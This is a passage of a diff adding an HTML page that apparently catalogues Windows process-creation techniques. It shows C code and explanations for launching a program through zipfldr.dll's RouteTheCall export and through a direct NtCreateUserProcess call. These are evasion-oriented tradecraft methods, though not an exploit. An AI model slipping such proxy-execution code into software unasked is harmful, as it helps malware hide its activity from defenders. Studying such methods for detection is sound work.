+the zipfldr.dll library using the GetProcAddressA function, which retrieves the address of an exported function or 
+variable from a DLL module. If the function is found, it is called with NULL as the HWND and HINSTANCE parameters, and 
+ccPath as the LPCSTR parameter. If the RouteTheCall function call is successful, the function returns TRUE (non-zero), 
+indicating that the operation succeeded. Otherwise, it returns FALSE (zero), indicating that the operation failed. 
+Finally, if the zipfldr.dll library was loaded, the function unloads it using the FreeLibrary function.
+
+BOOL CreateProcessFromZipfldrRouteCallW(LPCWSTR PathToFile)
+{
+	typedef VOID(WINAPI* ROUTETHECALL)(HWND, HINSTANCE, LPCSTR);
+	ROUTETHECALL RouteTheCall = NULL;
+	HMODULE hMod = NULL;
+	BOOL bFlag = FALSE;
+	CHAR ccPath[MAX_PATH] = { 0 };
+
+	hMod = LoadLibraryW(L"zipfldr.dll");
+	if (hMod == NULL)
+		goto EXIT_ROUTINE;
+
+	if (WCharStringToCharString(ccPath, (PWCHAR)PathToFile, StringLengthW(PathToFile)) == NULL)
+		goto EXIT_ROUTINE;
+
+	RouteTheCall = (ROUTETHECALL)GetProcAddressA((DWORD64)hMod, "RouteTheCall");
+	if (!RouteTheCall)
+		goto EXIT_ROUTINE;
+
+	RouteTheCall(NULL, NULL, ccPath);
+
+	bFlag = TRUE;
+
+EXIT_ROUTINE:
+
+	if (hMod)
+		FreeLibrary(hMod);
+
+	return bFlag;
+}
+
+********************************************************************************************************************************************************************************************
+                                                  _ ,                               
+                                                                                                                                                         
+88b           d88                       88                                 88     88888888888  88     ad88                                               
+888b         d888                ,d     88                                 88     88           ""    d8"      ,d                                         
+88`8b       d8'88                88     88                                 88     88                 88       88                                         
+88 `8b     d8' 88   ,adPPYba,  MM88MMM  88,dPPYba,    ,adPPYba,    ,adPPYb,88     88aaaaa      88  MM88MMM  MM88MMM  ,adPPYba,   ,adPPYba,  8b,dPPYba,   
+88  `8b   d8'  88  a8P_____88    88     88P'    "8a  a8"     "8a  a8"    `Y88     88"""""      88    88       88    a8P_____88  a8P_____88  88P'   `"8a  
+88   `8b d8'   88  8PP"""""""    88     88       88  8b       d8  8b       88     88           88    88       88    8PP"""""""  8PP"""""""  88       88  
+88    `888'    88  "8b,   ,aa    88,    88       88  "8a,   ,a8"  "8a,   ,d88     88           88    88       88,   "8b,   ,aa  "8b,   ,aa  88       88  
+88     `8'     88   `"Ybbd8"'    "Y888  88       88   `"YbbdP"'    `"8bbdP"Y8     88           88    88       "Y888  `"Ybbd8"'   `"Ybbd8"'  88       88  
+                                                                                                                                                         
+                                                                                                                                                         
+                                                                                    
+********************************************************************************************************************************************************************************************
+
+The code snippet provided is a C++ function called CreateProcessViaNtCreateUserProcessW, which creates a new process 
+using the NtCreateUserProcess API function. The function first initializes various variables and structures, then loads 
+the necessary functions from the ntdll.dll module using GetModuleHandleEx2W and GetProcAddressA. It creates a 
+ProcessParameters structure using RtlCreateProcessParametersEx, which specifies the process's parameters such as the 
+command line arguments and working directory. It also creates an AttributeList structure containing process attributes 
+such as the image name. The NtCreateUserProcess function is then called to actually create the process, passing in the 
+necessary parameters and attributes. Finally, the function cleans up by freeing memory and returning any error codes 
+encountered.
+
+DWORD CreateProcessViaNtCreateUserProcessW(PWCHAR BinaryPath)
+{
+	NTCREATEUSERPROCESS NtCreateUserProcess;
+	RTLCREATEPROCESSPARAMETERSEX RtlCreateProcessParametersEx;
+	RTLDESTROYPROCESSPARAMETERS RtlDestroyProcessParameters;
+	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
+	UNICODE_STRING NtImagePath = {0};
+	WCHAR MsDosFullPath[MAX_PATH * sizeof(WCHAR)] = { 0 };
+	PS_CREATE_INFO CreateInfo = { 0 };
+	HMODULE hModule;
+	PPS_ATTRIBUTE_LIST AttributeList = NULL;
+	HANDLE hHandle = NULL, hThread = NULL;
+	DWORD dwError = ERROR_SUCCESS;
+
+	CreateInfo.Size = sizeof(CreateInfo);
+	CreateInfo.State = PsCreateInitialState;
+
+	hModule = GetModuleHandleEx2W(L"ntdll.dll");
+	if (hModule == NULL)
+		return GetLastErrorFromTeb();
+
+	NtCreateUserProcess = (NTCREATEUSERPROCESS)GetProcAddressA((DWORD64)hModule, "NtCreateUserProcess");
+	if (NtCreateUserProcess == NULL)
+		return GetLastErrorFromTeb();
+
+	RtlCreateProcessParametersEx = (RTLCREATEPROCESSPARAMETERSEX)GetProcAddressA((DWORD64)hModule, "RtlCreateProcessParametersEx");
+	if (RtlCreateProcessParametersEx == NULL)
+		return GetLastErrorFromTeb();
+
+	RtlDestroyProcessParameters = (RTLDESTROYPROCESSPARAMETERS)GetProcAddressA((DWORD64)hModule, "RtlDestroyProcessParameters");
+	if (RtlDestroyProcessParameters == NULL)
+		return GetLastErrorFromTeb();
+
+	StringCopyW(MsDosFullPath, (PWCHAR)L"\\??\\");
+	StringConcatW(MsDosFullPath, BinaryPath);
+
+	RtlInitUnicodeString(&NtImagePath, MsDosFullPath);
+
+	if (RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED) != ERROR_SUCCESS)
+		return GetLastErrorFromTeb();
+
+	AttributeList = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
+	if (AttributeList)
+	{
+		AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
+		AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
+		AttributeList->Attributes[0].Size = NtImagePath.Length;
+		AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;
+
+		if (NtCreateUserProcess(&hHandle, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, &CreateInfo, AttributeList) != ERROR_SUCCESS)
+			dwError = GetLastErrorFromTeb(); //?
+	}
+
+	if (AttributeList)
+		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, AttributeList);
+
+	if (ProcessParameters)
+		RtlDestroyProcessParameters(ProcessParameters);
+
+	return dwError;
+}
+
+</pre>
+</html>
